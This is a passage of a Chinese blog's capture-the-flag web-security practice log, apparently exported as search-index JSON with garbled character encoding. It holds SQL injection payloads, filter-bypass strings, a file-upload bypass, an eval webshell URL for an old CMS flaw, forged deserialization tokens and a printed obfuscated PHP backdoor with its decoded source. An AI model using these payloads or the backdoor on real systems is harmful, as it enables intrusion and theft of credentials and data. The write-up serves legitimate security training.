\"M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=\", \"login_url\": \"/login\", } æ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨æ³¨å…¥çš„æ—¶å€™ï¼Œåªéœ€è¦å°† payload ç”¨ cookie_secret åŠ å¯†å³å¯ã€‚å€ŸåŠ© tornado å†™ä¸ªè„šæœ¬ï¼š import tornado.web import tornado.ioloop settings = { 'cookie_secret': 'M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=' } class MainHandler(tornado.web.RequestHandler): def get(self): self.write('aaa') # self.set_secure_cookie('username', \"' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#\") # self.set_secure_cookie('username', \"' and updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='manager'),0x7e),1)#\") # self.set_secure_cookie('username', \"' and updatexml(1,concat(0x7e, (select group_concat(username,'||',password,'||',email) from manager),0x7e),1)#\") self.set_secure_cookie('username', \"' and updatexml(1,concat(0x7e, mid((select group_concat(username,'||',password,'||',email) from manager),30,40),0x7e),1)#\") self.write(self.get_secure_cookie('username')) def makeapp(): return tornado.web.Application([ (r'/index', MainHandler), ], **settings) app = makeapp() app.listen(8089) tornado.ioloop.IOLoop.instance().start() æµè§ˆå™¨è®¿é—®æœ¬æœº 8089 ç«¯å£ï¼Œåœ¨è¿”å›å¤´ Set-Cookie ä¸­å¾—åˆ°åŠ å¯†åçš„æ³¨å…¥è¯­å¥ï¼Œå¸¦ç€è¿™ä¸ª cookie è®¿é—®ç½‘é¡µçš„ /lockï¼ˆè€Œä¸æ˜¯ /loginï¼‰ã€‚åœ¨çˆ†ç”¨æˆ·åã€å¯†ç å’Œé‚®ç®±æ—¶ï¼Œæ˜¾ç¤ºé•¿åº¦æœ‰é™åˆ¶ï¼Œå› æ­¤éœ€è¦åˆ†ä¸¤æ¬¡ç”¨ mid æˆªå–ï¼Œæœ€ç»ˆå¾—åˆ°ç”¨æˆ·åã€å¯†ç å’Œé‚®ç®±ä¸ºï¼š ichuqiu||318a61264482e503090facfc4337207f||545 å¯†ç ç»è¿‡ MD5 è§£å¯†å¾—åˆ°ï¼šMyxss623ã€‚ç™»å½•åœ¨åå°å‘ç° f13g_ls_here.txt æ–‡ä»¶ï¼Œç»§ç»­é€šè¿‡æ³¨å…¥è¯»å–è¯¥æ–‡ä»¶ã€‚å°†ä»£ç ä¸­ set_secure_cookie çš„ç¬¬äºŒä¸ªå‚æ•°æ”¹ä¸ºï¼š \"' and updatexml(1,concat(0x7e, (select load_file('/var/www/html/fl3g_ls_here.txt')),0x7e),1)#\" ç„¶åæ•…æŠ€é‡æ–½ï¼Œç”±äºé•¿åº¦é™åˆ¶åªå¾—åˆ°ä¸€éƒ¨åˆ† flagï¼Œå†ä¿®æ”¹ payloadï¼š \"' and updatexml(1,concat(0x7e, mid((select load_file('/var/www/html/f13g_ls_here.txt')),30,40),0x7e),1)#\" å³å¯å¾—åˆ°ç¬¬äºŒéƒ¨åˆ†ã€‚ ","date":"2019-08-24","objectID":"/icq-web/:7:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"å†è§ CMS æ ¹æ®ç™»å½•é¡µé¢é¡µè„šå¯ä»¥åˆ¤æ–­å‡ºè¯¥ CMS ä¸ºé½åš CMSã€‚æ¼æ´å‚è€ƒï¼Œå¾ˆå·§å¦™åœ°åˆ©ç”¨äº†è½¬ä¹‰è¿›è¡Œ SQL æ³¨å…¥ã€‚ æ ¹æ®å‚è€ƒçš„æ–‡ç« ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åå»ä¼šå‘˜ä¸­å¿ƒä¿®æ”¹ä¸ªäººä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°è¡¨å•ä¸­æ¯ä¸€é¡¹å¯¹åº”ä»€ä¹ˆå‚æ•°ã€‚ç„¶åæ„é€  payloadï¼š /member/userinfo.php?job=edit\u0026step=2 POST æ•°æ®ï¼š truename=xxxx%0000\u0026Limitword[000]=\u0026email=123456@qq.com\u0026provinceid=,address=(select database()) where uid=3# é¦–å…ˆ uid å¯¹åº”è‡ªå·±è´¦æˆ·çš„ uidï¼Œåœ¨ä¸ªäººä¿¡æ¯å¤„å¯ä»¥åœ¨ url ä¸­çœ‹åˆ°ã€‚æ³¨å…¥çš„å…·ä½“åŸç†å‚è€ƒ â€œæ¼æ´å‚è€ƒâ€ æ–‡ç« ï¼Œæ³¨å…¥ç‚¹æ˜¯å‚æ•° provinceidï¼Œæ³¨æ„ä¸æ˜¯ addressã€‚ è¿™æ ·å¯ä»¥åœ¨ä¸ªäººä¿¡æ¯é¡µé¢çš„ â€œè”ç³»åœ°å€â€ ä¸€æ å¾—åˆ°æ•°æ®åº“å blogã€‚æ¥ä¸‹æ¥çˆ†è¡¨åï¼š truename=xxxx%0000\u0026Limitword[000]=\u0026email=123456@qq.com\u0026provinceid=,address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where uid=3# æˆ‘ä»¬å…³å¿ƒçš„æ˜¯è¡¨ adminã€‚çˆ†åˆ—åï¼Œæ³¨æ„å•åŒå¼•å·ä¼šè¢«è½¬ä¹‰æ‰€ä»¥ä¸èƒ½ä½¿ç”¨ï¼Œå¯ä»¥ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼š truename=xxxx%0000\u0026Limitword[000]=\u0026email=123456@qq.com\u0026provinceid=,address=(select group_concat(column_name) from information_schema.columns where table_name=0x61646d696e) where uid=3# çˆ†ç”¨æˆ·åå’Œå¯†ç ï¼š truename=xxxx%0000\u0026Limitword[000]=\u0026email=123456@qq.com\u0026provinceid=,address=(select group_concat(username,0x7e,password) from admin) where uid=3# å¾—åˆ°ç”¨æˆ·å adminï¼Œå¯†ç  MD5 2638127c92b79ee7901195382dc08068ï¼Œæ™®é€š MD5 ç½‘ç«™è§£ä¸å‡ºæ¥ï¼Œåœ¨ https://hashkiller.co.uk/Cracker å’Œ http://www.chamd5.org/ ä¸Šç ´è§£å‡ºæ¥æ˜¯ 4b10b488e4c8ï¼Œä½†æ˜¯ç”¨è¿™ä¸ªå¯†ç ç™»å½•ä¸äº†ï¼Œå¯èƒ½æ–¹å‘é”™äº†å§ã€‚ æ— å¥ˆåªèƒ½æ‰«ä¸‹ç›®å½•å‘ç° flag.phpï¼Œç„¶ååˆ©ç”¨ SQL è¯»æ–‡ä»¶ï¼š truename=xxxx%0000\u0026Limitword[000]=\u0026email=123456@qq.com\u0026provinceid=,address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870)) where uid=3# å‘ç°è”ç³»åœ°å€è¿™æ¬¡å˜æˆäº†ç©ºç™½ï¼ŒF12 å¾—åˆ° flag.php æºç ä»è€Œå¾—åˆ° flagã€‚ ","date":"2019-08-24","objectID":"/icq-web/:8:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"SQL è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œç»•è¿‡æŠ€å·§æ˜¯ç”¨ \u003c\u003e æ¥åˆ†å‰²ï¼š id=1o\u003c\u003erderby1 å‘ç° by 4 çš„æ—¶å€™æ— å›æ˜¾ä½† by 3 çš„æ—¶å€™æœ‰ï¼Œè¯´æ˜å…± 3 åˆ—ã€‚ id=1unionse\u003c\u003elect1,2,3 å¾—åˆ°å›æ˜¾ 2ã€‚æ¥ä¸‹æ¥æ­£å¸¸æ³¨å…¥ï¼š id=1unionse\u003c\u003elect1,group_concat(table_name),3frominformation_schema.tableswheretable_schema=database()-- info, users id=1unionse\u003c\u003elect1,group_concat(column_name),3frominformation_schema.columnswheretable_name='info'-- id,title,flAg_T5ZNdrm id=1unionse\u003c\u003elect1,flAg_T5ZNdrm,3frominfo-- flag{...} ","date":"2019-08-24","objectID":"/icq-web/:9:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"SQLi F12 å‘ç° login.php?id=1ï¼Œä½†æ˜¯è¿™é‡Œå¥½åƒæ³¨å…¥ä¸äº†ã€‚ å›åˆ°å‰é¡µï¼Œå‘ç°é¡µé¢æ˜¯ç”± index.php 302 è·³è½¬æ¥çš„ï¼Œå› æ­¤æ£€æŸ¥ä¸€ä¸‹å¯¹äº index.php çš„è¯·æ±‚çš„è¿”å›å¤´ï¼Œå‘ç°äº†ç‰¹æ®Šå­—æ®µ pageï¼Œå¾—åˆ°çœŸæ­£çš„ç™»é™†é¡µé¢ l0gin.php?id=1ã€‚ è¿™ä¸ª id å¯ä»¥æ³¨å…¥ï¼Œä½†æ˜¯å­˜åœ¨é€—å·æˆªæ–­ï¼Œå› æ­¤éœ€è¦åœ¨æ²¡æœ‰é€—å·çš„æƒ…å†µä¸‹æ³¨å…¥ï¼Œè¿™é‡Œå¾ˆå®¹æ˜“æƒ³åˆ° joinã€‚å…ˆ order by æ³¨å…¥ï¼Œå¾—åˆ°åˆ—æ•°ä¸º 2ã€‚ id=1' order by 3%23 å°è¯•ä¸€ä¸‹ join: id=1'union select * from (select 1)a join (select 2)b%23 å‘ç°è¿˜æ˜¯æ­£å¸¸è¿”å› 1,flagï¼Œå› ä¸ºç½‘é¡µä¸Šé™åˆ¶äº†åªèƒ½æ˜¾ç¤ºä¸€æ¡è®°å½•ï¼Œè€Œ id=1 çš„æŸ¥è¯¢æ˜¯æˆåŠŸçš„ï¼Œå› æ­¤åé¢æˆ‘ä»¬ union çš„ç»“æœæ²¡æœ‰å›æ˜¾å‡ºæ¥ã€‚å› æ­¤åªéœ€è¦è®© id=3 ä½¿å¾—æŸ¥è¯¢ä¸åˆ° username å³å¯ã€‚ æœ€åæ­£å¸¸æ³¨å…¥ï¼š id=3'union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b%23 id=3'union select * from (select 1)a join (select group_concat(column_name) from information_schema.columns where table_name='users')b%23 id=3'union select * from (select 1)a join (select flag_9c861b688330 from users)b%23 ","date":"2019-08-24","objectID":"/icq-web/:10:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"123 F12 å¾—åˆ° user.php å’Œç”¨æˆ·é»˜è®¤å¯†ç ï¼Œä¸‹è½½ user.php.bakï¼Œæ‰“å¼€å¾—åˆ°ä¸€å †ç”¨æˆ·åã€‚Intruder ç”¨ BatteringRam æ¨¡å¼çˆ†ç ´ç”¨æˆ·åå¯†ç ï¼Œç™»é™†å F12 å¾—åˆ°ï¼š \u003c!-- å­˜åœ¨æ¼æ´éœ€è¦å»æ‰ --\u003e \u003c!-- \u003cform action=\"\"method=\"POST\"enctype=\"multipart/form-data\"\u003e \u003cinput type=\"file\"name=\"file\"/\u003e \u003cinput type=\"submit\"name=\"submit\"value=\" ä¸Šä¼  \"/\u003e \u003c/form\u003e --\u003e è¿™é‡ŒçŒœæµ‹æ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚æ¢å¤å‰ç«¯ä»£ç åéšä¾¿é€‰ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œå‘ç°åªèƒ½ä¼ å›¾ç‰‡æ–‡ä»¶ï¼Œå› æ­¤ä¿®æ”¹ Content-Type å’Œæ–‡ä»¶å†…å®¹ã€‚Content-Type è®¾ç½®ä¸º image/pngï¼Œæ–‡ä»¶å†…å®¹ä¸­å†™å…¥ PNG æ–‡ä»¶å¤´ PNGã€‚ç„¶åå°†æ–‡ä»¶åæ”¹ä¸º 1.png.phpï¼Œä½†æ˜¯æç¤º æ–‡ä»¶åä¸èƒ½åŒ…å« phpã€‚ å› æ­¤å°è¯• 1.png.pht ç»•è¿‡ï¼Œå¾—åˆ°é¡µé¢ view.phpã€‚åªæœ‰ä¸€ä¸ªæç¤º file?ï¼Œå°è¯•ä¼ å…¥ GET å‚æ•° file=flagï¼Œå¾—åˆ°æç¤º filter 'flag'ï¼Œäºæ˜¯åŒå†™ç»•è¿‡ã€‚ ","date":"2019-08-24","objectID":"/icq-web/:11:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"Test æµ·æ´‹ CMS å¾ˆè€çš„æ¼æ´ï¼Œæ¼æ´è¯¦æƒ…ã€‚ ç›´æ¥èšå‰‘è¿æ¥ /search.php?searchtype=5\u0026tid=\u0026area=eval($_POST[1]) æ¥ getshellã€‚ä½†æ˜¯æ²¡æœ‰æ‰¾åˆ° flagã€‚ åˆ° /var/www/html/data/common.inc.php æ‰¾åˆ°æ•°æ®åº“é…ç½®ï¼š \u003c?php // æ•°æ®åº“è¿æ¥ä¿¡æ¯ $cfg_dbhost = '127.0.0.1'; $cfg_dbname = 'seacms'; $cfg_dbuser = 'sea_user'; $cfg_dbpwd = '46e06533407e'; $cfg_dbprefix = 'sea_'; $cfg_db_language = 'utf8'; ?\u003e åœ¨èšå‰‘ä¸­é€‰æ‹© æ•°æ®æ“ä½œï¼Œç„¶åè¾“å…¥ä¸Šé¢çš„é…ç½®ä¿¡æ¯ï¼Œå¯ä»¥åœ¨ seacms æ•°æ®åº“çš„ flag_140ad2e0d8cb è¡¨ä¸­æ‰§è¡Œ SQL è¯­å¥å¾—åˆ° flagã€‚ ","date":"2019-08-24","objectID":"/icq-web/:12:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"Login F12 ä¸­æç¤ºè´¦æˆ·å¯†ç éƒ½ä¸º test1ï¼Œç™»å½•ååœ¨å“åº”å¤´ä¸­å‘ç° show å­—æ®µï¼ŒæŠŠ 0 åœ¨è¯·æ±‚å¤´æ”¹æˆ 1 è¯•è¯•ï¼Œå‘ç°æ³¨é‡Šä¸­è¿”å›äº†æºç ã€‚ \u003c?php include 'common.php'; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); class db { public $where; function __wakeup() { if(!empty($this-\u003ewhere)) { $this-\u003eselect($this-\u003ewhere); } } function select($where) { $sql = mysql_query('select * from user where'.$where); return @mysql_fetch_array($sql); } } if(isset($requset['token'])) { $login = unserialize(gzuncompress(base64_decode($requset['token']))); $db = new db(); $row = $db-\u003eselect('user=\\''.mysql_real_escape_string($login['user']).'\\''); if($login['user'] ==='ichunqiu') { echo $flag; }else if($row['pass'] !== $login['pass']){ echo 'unserialize injection!!'; }else{ echo \"(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´ \"; } }else{ header('Location: index.php?error=1'); } ?\u003e è¿™é‡Œéœ€è¦ä»¥ ichunqiu ç™»å½•ï¼Œå…³é”®å°±åœ¨äºé‚£ä¸ªååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚è€Œä¸”ï¼Œarray_merge åˆå¹¶æ—¶ï¼Œé‡åˆ°ç›¸åŒçš„é”®å–æœ€åçš„é‚£ä¸ªå€¼ã€‚ å†™ä¸ªè„šæœ¬ç”Ÿæˆéœ€è¦çš„ tokenï¼Œç„¶åæ”¾åœ¨ cookie é‡Œå‘é€å°±å¥½äº†ã€‚ \u003c?php $a = array('user' =\u003e 'ichunqiu'); echo base64_encode(gzcompress(serialize($a))); ?\u003e ","date":"2019-08-24","objectID":"/icq-web/:13:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"Backdoor æ‰«ç›®å½•å‘ç° .git æ³„éœ²ã€‚ä¸Š GitHack æŠŠ .git ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åå‘ç°éœ€è¦å›é€€ã€‚ å€¼å¾—è®°å½•çš„æ˜¯ GitHack å¥½åƒæ²¡èƒ½æŠŠ .git ä¸‹ä¸‹æ¥ï¼Œåªèƒ½ä¸‹è½½æ‰€æœ‰æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä½¿ç”¨äº† dvcs ripper è¿™ä¸ªå·¥å…·ï¼š ./rip-git.pl -v -u http://1355bb65468a451b9487c15dba117690cff7627b879e42f2. changame.ichunqiu.com/Challenges/.git/ è®¿é—® /Challenges/.git/logs/HEAD å¯ä»¥æŸ¥çœ‹æäº¤è®°å½•ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ git log æŸ¥çœ‹ã€‚éšåå›é€€åˆ°ä¹‹å‰çš„ç‰ˆæœ¬ï¼š git reset --hard 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88 cat flag.php è¿™æ—¶å¯ä»¥çœ‹åˆ°ï¼Œflag.php å†…å®¹å˜ä¸ºï¼š \u003c?php echo \"flag{true_flag_is_in_the_b4ckdo0r.php}\"; ?\u003e é‚£ä¹ˆæˆ‘ä»¬ç»§ç»­è®¿é—® b4ckdo0r.phpï¼Œæç¤ºè¦æ‰¾å‡ºå…¶æºç ã€‚è¿™ç§ä¸€èˆ¬éƒ½å­˜åœ¨å¤‡ä»½æ–‡ä»¶é‡Œï¼Œä¾‹å¦‚ vim ä¸­çš„ .swo å’Œ .swpï¼Œé€ä¸€å°è¯•å¾—å¤‡ä»½æ–‡ä»¶ .b4ckdo0r.php.swpï¼Œç”¨ vim -r æ¢å¤ï¼š \u003c?php echo \"can you find the source code of me?\"; /** * Signature For Report */$h='_)m/\",\"/-/)m\"),)marray()m\"/\",\"+\")m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)';/* */$H='m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(\"\u003c)m$k\u003e$d\u003c)m/)m$k\u003e)m\");@sessio)mn_d)mestroy();}}}}';/* */$N='mR;$rr)m=@$r[)m\"HTT)mP_RE)mFERER\"];$ra)m=)m@$r[\"HTTP_AC)mC)mEPT_LANG)mUAGE)m\")m];if($rr)m\u0026\u0026$ra){)m$u=parse_u)mrl($rr);p';/* */$u='$e){)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(\"/';/* */$f='$i\u003c$)ml;)m){)mfo)mr($j)m=0;($j\u003c$c\u0026\u0026$i\u003c$l);$j)m++,$i+)m+){$)mo.=$t{$i)m}^$)mk{$j};}}r)meturn )m$o;}$r)m=$_SERVE)';/* */$O='[$i]=\"\";$p)m=$)m)mss($p,3)m);}if(ar)mray_)mkey_exists)m()m$i,$s)){$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(';/* */$w=')m));)m$p=\"\";fo)mr($z=1;)m$z\u003cc)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0){$s)m';/* */$P='trt)molower\";$)mi=$m[1][0)m)m].$m[1][1])m;$h=strtolower()msubstr(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml(substr()m)mmd5($i.$kf),0,3';/* */$i=')marse_)mstr)m($u[\"q)muery\"],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m\"/([\\\\w)m])m)[\\\\w-)m]+(?:;q=0.)';/* */$x='m([\\\\d)m]))?,?/\",)m$ra,$m))m;if($q)m\u0026\u0026$)mm))m)m{@session_start();$)ms=\u0026$_S)mESSI)m)mON;$)mss=\"sub)mstr\";strtolower=\"s)m';/* */$y=str_replace('b','','crbebbabte_funcbbtion');/* */$c='$kh=\"4f7)m)mf\";$kf=\"2)m)m8d7\";funct)mion x($t)m,$k){$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=\"\";for()m$i=0;';/* */$L=str_replace(')m','',$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/* */$v=$y('',$L);$v();/* */ ?\u003e è¿™é‡Œçš„ä»£ç ç»è¿‡äº†æ··æ·†ï¼Œæˆ‘ä»¬åœ¨ä»£ç æœ«å°¾åŠ ä¸Šä¸€æ®µä»£ç æ¥è¿›è¡Œåˆ†æï¼š echo var_dump($L); echo $y; echo $v; å¾—åˆ°åŸæœ¬çš„æ ¸å¿ƒä»£ç  ($L)ï¼š \u003c?php $kh=\"4f7f\"; $kf=\"28d7\"; function x($t,$k) { $c=strlen($k); $l=strlen($t); $o=\"\"; for($i=0; $i\u003c$l;) { for($j=0; ($j\u003c$c\u0026\u0026$i\u003c$l); $j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o; }$r=$_SERVER; $rr=@$r[\"HTTP_REFERER\"]; $ra=@$r[\"HTTP_ACCEPT_LANGUAGE\"]; if($rr\u0026\u0026$ra) { $u=parse_url($rr); parse_str($u[\"query\"],$q); $q=array_values($q); preg_match_all(\"/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\",$ra,$m); if($q\u0026\u0026$m) { @session_start(); $s=\u0026$_SESSION; $i=$m[1][0].$m[1][1]; $h=strtolower(substr(md5($i.$kh),0,3)); $f=strtolower(substr(md5($i.$kf),0,3)); $p=\"\"; for($z=1; $z\u003ccount($m[1]); $z++)$p.=$q[$m[2][$z]]; if(strpos($p,$h)===0) { $s[$i]=\"\"; $p=substr($p,3); } if(array_key_exists($i,$s)) { $s[$i].=$p; $e=strpos($s[$i],$f); if($e) { $k=$kh.$kf; ob_start(); //ï¼ @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(\"/_/\",\"/-/\"),array(\"/\",\"+\"),substr($s[$i],0,$e))),$k))); $o=ob_get_contents(); ob_end_clean(); $d=base64_encode(x(gzcompress($o),$k)); print(\"\u003c$k\u003e$d\u003c/$k\u003e\"); @session_destroy(); } } } } ä»£ç çš„é‡ç‚¹åœ¨äº Accept-Languageï¼ŒReferer å’Œæ„Ÿå¹å·æ‰€åœ¨çš„è¡Œï¼Œå› ä¸ºå¯ä»¥ç”¨ eval æ‰§è¡Œä»£ç ã€‚ é¦–å…ˆ x å‡½æ•°æ˜¾ç„¶æ˜¯å¾ªç¯å¼‚æˆ–ã€‚éšåä»”ç»†é˜…è¯» preg_match_all çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå‘ç°å®ƒå°† Accept-Language åˆ†æˆäº† 3 éƒ¨åˆ†ï¼Œm[0] å­˜æ¯ç§è¯­è¨€çš„å®Œæ•´å­—ç¬¦ä¸²ï¼Œm[1] å­˜é¦–å­—æ¯ï¼Œm[2] å­˜è¯­è¨€æƒé‡å°æ•°ç‚¹åçš„æ•°å­—ã€‚ Accept-Language æ ¼å¼ï¼šè¯­è¨€;q=æƒé‡ï¼Œä¾‹å¦‚ en-US;q=0.5 è€Œ $i å–çš„æ˜¯ $m[1][0].$m[1][1]ï¼Œä¹Ÿå°±æ˜¯å‰ä¸¤ç§è¯­è¨€çš„é¦–å­—æ¯ã€‚$h å’Œ $f ä¸éš¾è®¡ç®—ï¼Œæˆ‘ä»¬å‡è®¾è¾“å…¥çš„è¯­è¨€æ˜¯ zh-CN,zhï¼Œé‚£ä¹ˆ $i å°±æ˜¯ zzï¼Œè®¡ç®—å¾—åˆ° $h ä¸º 675ï¼Œ$f ä¸º a3eã€‚ ä¸è¿‡ä¸‹é¢çš„ for å¾ªç¯æœ‰ç‚¹ç»•ï¼š for($z=1; $z\u003ccount($m[1]); $z++) $p.=$q[$m[2][$z]]; $z æŒ‡å½“å‰æ˜¯ç¬¬å‡ ç§è¯­è¨€ï¼Œ$m[2][$z] å°±æ˜¯è¯¥è¯­è¨€æƒé‡çš„å°æ•°ç‚¹åç¬¬ä¸€ä½ï¼Œä»¥è¿™ä¸ªå€¼ä¸ºç´¢å¼•å–å¾— Referer çš„ url ä¸­ query string é‡Œå¯¹åº”ç´¢å¼•çš„é‚£ä¸ªå‚æ•°å€¼æ‹¼æ¥åˆ° $p ä¸Šã€‚ ä¸‹é¢çš„ if åˆ¤æ–­ $p æ˜¯ä¸æ˜¯ä»¥ $h å¼€å¤´ $f ç»“å°¾ï¼Œå¦‚æœæ˜¯åˆ™è¿›å…¥ä¸‹é¢çš„ eval å‡½æ•°ï¼Œæˆ‘ä»¬æ‰èƒ½å®ç°å‘½ä»¤æ³¨å…¥ã€‚eval å‡½æ•°å†…æ˜¯ä¸€ä¸ªç®€å•çš„å†™é€†å‘å‡½æ•°çš„è¿‡ç¨‹ã€‚ è„šæœ¬ï¼š \u003c?php // ç…§æ¬ function x($t,$k) { $c=strlen($k); $l=strlen($t); $o=\"\"; for($i=0; $i\u003c$l;) { for($j=0; ($j\u003c$c\u0026\u0026$i\u003c$l); $j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o; } function inject","date":"2019-08-24","objectID":"/icq-web/:14:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"GetFlag ç†Ÿæ‚‰çš„çˆ†ç ´ md5 å¥—è·¯ï¼š import hashlib, sys for i in range(10**5, 10**8): val = hashlib.md5(str(i)).hexdigest() if val[:6] == sys.argv[1]: print(i) break ç”¨æˆ·åå¯ä»¥ç›´æ¥æ³¨å…¥ï¼Œå¯†ç ä»»æ„ã€‚ç™»å½•åå¯ä»¥çœ‹åˆ°ä¸‰ä¸ªæ–‡ä»¶ã€‚æç¤ºè¯´ flag åœ¨ web æ ¹ç›®å½•ã€‚æ³¨æ„åˆ°æ–‡ä»¶çš„ä¸‹è½½ url ä¸ºï¼š /Challenges/file/download.php?f=a.php å¯ä»¥å°è¯•ä¸‹è½½ flag.phpï¼Œä½†æ˜¯æ˜¾ç¤º flag{wow!!!but not true}ã€‚çŒœæƒ³è¿™é‡Œå¯èƒ½ä¸èƒ½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œæ¢æˆç»å¯¹è·¯å¾„ï¼š /Challenges/file/download.php?f=/var/www/html/Challenges/flag.php å¾—åˆ°æºç ï¼š \u003c?php $f = $_POST['flag']; $f = str_replace(array('`','$','*','#',':','\\\\','\"',\"'\",'(',')','.','\u003e'),'', $f); if((strlen($f) \u003e 13) || (false !== stripos($f,'return'))) { die('wowwwwwwwwwwwwwwwwwwwwwwwww'); } try { eval(\"\\$spaceone = $f\"); } catch (Exception $e) { return false; } if ($spaceone ==='flag'){ echo file_get_contents(\"helloctf.php\"); } ?\u003e ã€‚ã€‚ã€‚çœ‹ä¼¼è¿‡æ»¤ä¸€å¤§å †ï¼Œå®é™…ä¸Šç›´æ¥ POST æäº¤ flag=flag; å°±å®Œäº†ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯æœ€åçš„åˆ†å·ã€‚ ","date":"2019-08-24","objectID":"/icq-web/:15:0","tags":["PHP","Hash","å¤å…¸å¯†ç ä¸ç¼–ç ","SQLi","æ–‡ä»¶ä¸Šä¼ ","ååºåˆ—åŒ–"],"title":"i æ˜¥ç§‹ Web ç»ƒä¹ è®°å½•","uri":"/icq-web/"},{"categories":["Web å®‰å…¨"],"content":"Not Found é¦–é¡µç›´æ¥è·³è½¬åˆ°ä¸å­˜åœ¨çš„ 404.phpï¼Œåœ¨å“åº”å¤´ä¸­å‘ç° X-Method: haha å­—æ®µã€‚ä¸€æ¬¡å°è¯• HTTP æ–¹æ³•ï¼Œå½“ä½¿ç”¨ OPTIONS æ—¶ï¼Œå‘ç°å“åº”å¤´ä¸­å¤šå‡ºäº† Location: ?f=1.php å­—æ®µã€‚å¯¹è¿™ä¸ª url ä¹Ÿè¿›è¡Œ OPTIONS è¯·æ±‚ï¼Œå¾—åˆ°ä¸€æ®µæºç ï¼š \u003c?php $msg = \"not here\"; $msg .= PHP_EOL; $msg .=\"plz trying\"; echo $msg; ç›´æ¥è®¿é—® 1.php å‘ç°è¿™å°±æ˜¯ 1.php çš„æºç ã€‚çŒœæµ‹è¿™ä¸ª f å‚æ•°çš„åŠŸèƒ½å°±æ˜¯æ–‡ä»¶è¯»å–ï¼Œå°è¯• index.php å‘ç°ä¸å…è®¸ã€‚æœ€åå‘ç° .htaccess å´å¯ä»¥è¯»ï¼š RewriteEngine On RewriteBase / RewriteRule ^8d829d8568e46455104209db5cd9228d.html$ 404.php [L] å› æ­¤æˆ‘ä»¬è®¿é—®è¿™ä¸ª html å¾—åˆ°æç¤ºï¼Œä¿®æ”¹ XFF 